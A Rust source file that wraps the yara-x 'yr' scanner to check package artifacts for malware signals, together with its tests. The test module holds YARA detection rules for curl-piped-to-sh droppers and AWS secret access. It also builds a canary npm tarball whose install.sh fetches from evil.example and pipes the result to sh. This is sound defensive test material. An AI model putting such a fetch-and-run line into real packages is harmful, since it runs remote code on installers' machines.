//! YARA as an [`ArtifactScanner`] (RFC 0036 §6.6): operator-supplied rules
//! from `[scanners.yara] rules_dir`, run by yara-x's `yr` inside the same
//! sandbox as the other byte-reading scanners (§11 q6). The rules run outside
//! the worker process; nothing here links a YARA engine.
//!
//! ```text
//! yr scan -o json -r -m -g --disable-console-logs <rules_dir> <work>/scan
//! ```
//!
//! What is scanned: the artifact as served, at `scan/artifact`, and — when it
//! is an archive [`extract_to`] knows — its contents under `scan/tree`, so a
//! rule can match either the blob or a file inside it. An artifact that is
//! not an archive (`.deb`, `.rpm`, a bare binary) is scanned as the blob
//! alone; an archive the extraction policy refuses (a bomb, a traversal) is
//! not scanned at all, as for every other tree scanner.
//!
//! A match is a [`FindingKind::MalwareSignal`] named after the rule. Its
//! severity is the rule's `severity` meta when that is one, else `high`: an
//! operator's own signature matching is a positive signal, and a rule that
//! means less says so in its meta. The policy decides whether it blocks.
//!
//! # Observed, not read
//!
//! yara-x 1.20.0: `-o json` prints one object, `matches[]` of `{rule, file,
//! meta, tags}`, after the whole scan; `yr` exits `0` with or without
//! matches and `1` when a rule does not compile. An empty rules directory
//! compiles to nothing and every scan is clean, which is why the worker
//! refuses one at startup. The matched strings (`-s`) are not asked for:
//! they are attacker bytes, and the rule name and file are the finding.

use std::path::{Path, PathBuf};
use std::time::Duration;

use async_trait::async_trait;

use batlehub_core::entities::{Finding, FindingKind, ReasonCode, RegistryKind, Severity};
use batlehub_core::ports::{ArtifactScanner, ScanInput, ScannerError};

use super::extract::{extract_to, sniff, ExtractPolicy};
use super::subprocess::{self, Invocation, Sandbox};

pub const NAME: &str = "yara";

pub struct YaraScanner {
    pub command: PathBuf,
    pub rules_dir: PathBuf,
    pub sandbox: Sandbox,
    pub extract: ExtractPolicy,
    pub timeout: Duration,
}

impl YaraScanner {
    /// Whether `dir` holds at least one rule file, at any depth, as `yr`
    /// reads it (`*.yar`, `*.yara`). A Kubernetes ConfigMap mount is a tree
    /// of symlinks into `..data`; following them is what finds its files.
    pub fn has_rules(dir: &Path) -> bool {
        let Ok(entries) = std::fs::read_dir(dir) else {
            return false;
        };
        entries.flatten().any(|e| {
            let path = e.path();
            if path.is_dir() {
                Self::has_rules(&path)
            } else {
                path.extension().is_some_and(|x| x == "yar" || x == "yara")
            }
        })
    }

    fn args(&self, target: &Path) -> Vec<String> {
        vec![
            "scan".into(),
            "--output-format".into(),
            "json".into(),
            "--recursive".into(),
            "--print-meta".into(),
            "--print-tags".into(),
            "--disable-console-logs".into(),
            self.rules_dir.to_string_lossy().into_owned(),
            target.to_string_lossy().into_owned(),
        ]
    }

    /// `yr`'s report as findings, with each file named relative to `root`
    /// (the scanned directory), never by the work directory's random path.
    pub fn map(doc: &serde_json::Value, root: &Path) -> Result<Vec<Finding>, ScannerError> {
        let Some(matches) = doc.get("matches").and_then(|m| m.as_array()) else {
            return Err(ScannerError::Output(
                "yr output carried no `matches` array".into(),
            ));
        };
        let mut out = Vec::with_capacity(matches.len());
        for m in matches {
            let rule = m.get("rule").and_then(|r| r.as_str()).unwrap_or("unknown");
            let file = m.get("file").and_then(|f| f.as_str()).unwrap_or("");
            let file = Path::new(file)
                .strip_prefix(root)
                .map(|p| p.to_string_lossy().into_owned())
                .unwrap_or_else(|_| file.to_owned());
            let severity = m
                .get("meta")
                .and_then(|meta| meta.get("severity"))
                .and_then(|s| s.as_str())
                .and_then(Severity::parse)
                .unwrap_or(Severity::High);
            let mut raw = m.clone();
            raw["file"] = serde_json::Value::String(file.clone());
            out.push(
                Finding::new(
                    NAME,
                    FindingKind::MalwareSignal,
                    ReasonCode::MalwareSignal,
                    severity,
                    format!("YARA rule {rule} matched {file}"),
                )
                .with_reference(rule)
                .with_raw(raw),
            );
        }
        Ok(out)
    }

    /// The scanned directory: the blob, and its contents when it is an
    /// archive. Returned so the caller can name files relative to it.
    fn materialise(&self, artifact: &[u8], work: &Path) -> Result<PathBuf, ScannerError> {
        let root = work.join("scan");
        std::fs::create_dir(&root)
            .map_err(|e| ScannerError::Other(format!("creating the scan dir: {e}")))?;
        std::fs::write(root.join("artifact"), artifact)
            .map_err(|e| ScannerError::Other(format!("writing the artifact: {e}")))?;
        if sniff(artifact).is_some() {
            extract_to(artifact, &root.join("tree"), &self.extract)?;
        }
        Ok(root)
    }
}

#[async_trait]
impl ArtifactScanner for YaraScanner {
    fn name(&self) -> &str {
        NAME
    }

    /// Every kind: a rule matches bytes, whatever packaged them.
    fn supports(&self, _kind: RegistryKind) -> bool {
        true
    }

    fn needs_artifact(&self) -> bool {
        true
    }

    async fn scan(&self, input: &ScanInput) -> Result<Vec<Finding>, ScannerError> {
        let Some(artifact) = input.artifact.as_ref() else {
            return Err(ScannerError::Unsupported(
                "yara needs the artifact bytes and none were provided".into(),
            ));
        };
        let work = subprocess::work_dir("yara")?;
        let root = self.materialise(artifact, work.path())?;
        let out = subprocess::run(
            &self.sandbox,
            &Invocation {
                command: self.command.clone(),
                args: self.args(&root),
                work_dir: work.path().to_path_buf(),
                needs_network: false,
                timeout: self.timeout,
            },
        )
        .await?;
        match out.status {
            Some(0) => {}
            // 1 is a rule that does not compile, or a target it cannot read:
            // not an answer, and the operator's to fix.
            Some(code) => {
                return Err(ScannerError::Crashed(format!(
                    "yr exited {code}: {}",
                    out.stderr_tail.trim()
                )))
            }
            None => return Err(ScannerError::Crashed("yr was killed".into())),
        }
        let doc = subprocess::parse_json(&out.stdout)?;
        Self::map(&doc, &root)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use batlehub_core::entities::{PackageId, PackageMetadata};
    use std::io::Write;

    const REPORT: &str = include_str!("fixtures/yr-scan.json");

    const RULES: &str = r#"
rule curl_pipe_sh : dropper {
  meta:
    severity = "critical"
  strings:
    $a = /curl[^|\n]{0,200}\|\s*sh/
  condition:
    $a
}
rule aws_secret {
  strings:
    $k = "AWS_SECRET_ACCESS_KEY"
  condition:
    $k
}
"#;

    fn scanner(rules_dir: &Path) -> YaraScanner {
        YaraScanner {
            command: PathBuf::from("yr"),
            rules_dir: rules_dir.to_path_buf(),
            // `bwrap` is not on every machine this runs on; its argv is
            // tested in `subprocess`.
            sandbox: Sandbox {
                runtime: "none".into(),
                ..Sandbox::default()
            },
            extract: ExtractPolicy::default(),
            timeout: Duration::from_secs(60),
        }
    }

    fn tgz(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut b = tar::Builder::new(Vec::new());
        for (name, data) in files {
            let mut h = tar::Header::new_ustar();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            b.append_data(&mut h, name, *data).unwrap();
        }
        let tar = b.into_inner().unwrap();
        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        gz.write_all(&tar).unwrap();
        gz.finish().unwrap()
    }

    fn input(artifact: Vec<u8>) -> ScanInput {
        ScanInput {
            package: PackageMetadata::minimal(
                PackageId::new("sec", "evil-pad", "1.3.1"),
                serde_json::Value::Null,
            ),
            kind: RegistryKind::Npm,
            purl: "pkg:npm/evil-pad@1.3.1".into(),
            artifact: Some(bytes::Bytes::from(artifact)),
            sbom: None,
            listing: None,
        }
    }

    #[test]
    fn the_observed_report_maps_to_one_finding_per_match() {
        let doc: serde_json::Value = serde_json::from_str(REPORT).unwrap();
        let findings = YaraScanner::map(&doc, Path::new("/tmp/batlehub-yara-Ab12Cd/scan")).unwrap();
        assert_eq!(findings.len(), 2);
        let aws = &findings[0];
        assert_eq!(aws.scanner, "yara");
        assert_eq!(aws.code, ReasonCode::MalwareSignal);
        assert_eq!(aws.reference.as_deref(), Some("aws_secret"));
        assert_eq!(aws.severity, Severity::High, "no severity meta → high");
        assert_eq!(aws.summary, "YARA rule aws_secret matched tree/sub/a.py");
        assert_eq!(aws.raw["file"], "tree/sub/a.py", "the work dir never leaks");
        assert_eq!(findings[1].severity, Severity::High, "from the rule's meta");
    }

    #[test]
    fn a_severity_meta_sets_the_finding_and_a_bad_one_falls_back() {
        let doc = serde_json::json!({ "matches": [
            { "rule": "a", "file": "/s/artifact", "meta": { "severity": "low" } },
            { "rule": "b", "file": "/s/artifact", "meta": { "severity": 3 } },
        ]});
        let f = YaraScanner::map(&doc, Path::new("/s")).unwrap();
        assert_eq!(f[0].severity, Severity::Low);
        assert_eq!(f[1].severity, Severity::High);
    }

    #[test]
    fn no_matches_is_a_clean_answer_and_no_array_is_not_an_answer() {
        let clean = serde_json::json!({ "version": "1.20.0", "matches": [] });
        assert!(YaraScanner::map(&clean, Path::new("/")).unwrap().is_empty());
        let err = YaraScanner::map(&serde_json::json!({ "ok": true }), Path::new("/")).unwrap_err();
        assert!(matches!(err, ScannerError::Output(_)));
    }

    #[test]
    fn a_rules_dir_needs_a_rule_file_at_some_depth() {
        let d = tempfile::tempdir().unwrap();
        assert!(!YaraScanner::has_rules(d.path()), "empty");
        std::fs::write(d.path().join("README"), "x").unwrap();
        assert!(!YaraScanner::has_rules(d.path()), "no rule file");
        assert!(!YaraScanner::has_rules(&d.path().join("absent")));
        // The ConfigMap layout: `x.yar -> ..data/x.yar`, `..data -> ..<ts>`.
        let ts = d.path().join("..2026_10_09");
        std::fs::create_dir(&ts).unwrap();
        std::fs::write(ts.join("x.yar"), RULES).unwrap();
        std::os::unix::fs::symlink(&ts, d.path().join("..data")).unwrap();
        std::os::unix::fs::symlink(d.path().join("..data/x.yar"), d.path().join("x.yar")).unwrap();
        assert!(YaraScanner::has_rules(d.path()));
    }

    #[test]
    fn an_archive_is_scanned_as_the_blob_and_as_its_contents() {
        let work = tempfile::tempdir().unwrap();
        let s = scanner(Path::new("/rules"));
        let root = s
            .materialise(&tgz(&[("package/install.sh", b"echo")]), work.path())
            .unwrap();
        assert!(root.join("artifact").is_file());
        assert!(root.join("tree/package/install.sh").is_file());
        let args = s.args(&root);
        assert_eq!(args[args.len() - 2], "/rules");
        assert_eq!(args.last().unwrap(), &root.to_string_lossy());
        assert!(!args.iter().any(|a| a.starts_with("--print-strings")));
    }

    #[test]
    fn a_blob_that_is_not_an_archive_is_scanned_alone() {
        let work = tempfile::tempdir().unwrap();
        let root = scanner(Path::new("/rules"))
            .materialise(b"!<arch>\ndebian-binary", work.path())
            .unwrap();
        assert!(root.join("artifact").is_file());
        assert!(!root.join("tree").exists());
    }

    /// The real `yr`, when it is on `PATH` (the worker image, or `mise
    /// install yara-x`): a canary npm tarball against two rules, one of them
    /// matching inside the archive only, and a rule that does not compile.
    #[tokio::test]
    async fn the_real_yr_finds_the_canary_and_refuses_a_broken_rule() {
        if !subprocess::command_exists(Path::new("yr")) {
            eprintln!("yr not on PATH; skipped");
            return;
        }
        let rules = tempfile::tempdir().unwrap();
        std::fs::write(rules.path().join("canary.yar"), RULES).unwrap();
        let canary = tgz(&[
            ("package/package.json", br#"{"name":"evil-pad"}"#),
            ("package/install.sh", b"curl https://evil.example/x | sh\n"),
            ("package/lib/a.js", b"process.env.AWS_SECRET_ACCESS_KEY\n"),
        ]);
        let mut findings = scanner(rules.path()).scan(&input(canary)).await.unwrap();
        findings.sort_by(|a, b| a.reference.cmp(&b.reference));
        let got: Vec<_> = findings
            .iter()
            .map(|f| {
                (
                    f.reference.as_deref().unwrap(),
                    f.raw["file"].as_str().unwrap(),
                    f.severity,
                )
            })
            .collect();
        assert_eq!(
            got,
            [
                ("aws_secret", "tree/package/lib/a.js", Severity::High),
                (
                    "curl_pipe_sh",
                    "tree/package/install.sh",
                    Severity::Critical
                ),
            ]
        );

        let clean = tgz(&[("package/index.js", b"module.exports = 1\n")]);
        assert!(scanner(rules.path())
            .scan(&input(clean))
            .await
            .unwrap()
            .is_empty());

        std::fs::write(
            rules.path().join("broken.yar"),
            "rule x { condition: nope }",
        )
        .unwrap();
        let err = scanner(rules.path())
            .scan(&input(tgz(&[("a", b"a")])))
            .await
            .unwrap_err();
        assert!(
            matches!(err, ScannerError::Crashed(ref m) if m.contains("nope")),
            "{err:?}"
        );
    }
}
